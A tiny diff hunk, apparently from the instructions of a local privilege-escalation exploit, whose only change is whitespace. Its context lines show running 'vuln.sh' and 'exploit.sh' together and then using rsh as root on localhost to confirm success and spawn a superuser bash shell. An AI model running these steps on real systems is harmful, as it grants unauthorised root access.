@@ -22,7 +22,7 @@ $ sh -x vuln.sh & sh -x exploit.sh
 Check if exploit was successful :  
 $ rsh -l root localhost whoami
 
-Spawn a new superuser privileged shell : 
+Spawn a new superuser privileged shell :  
 $ rsh -l root localhost bash
 
 
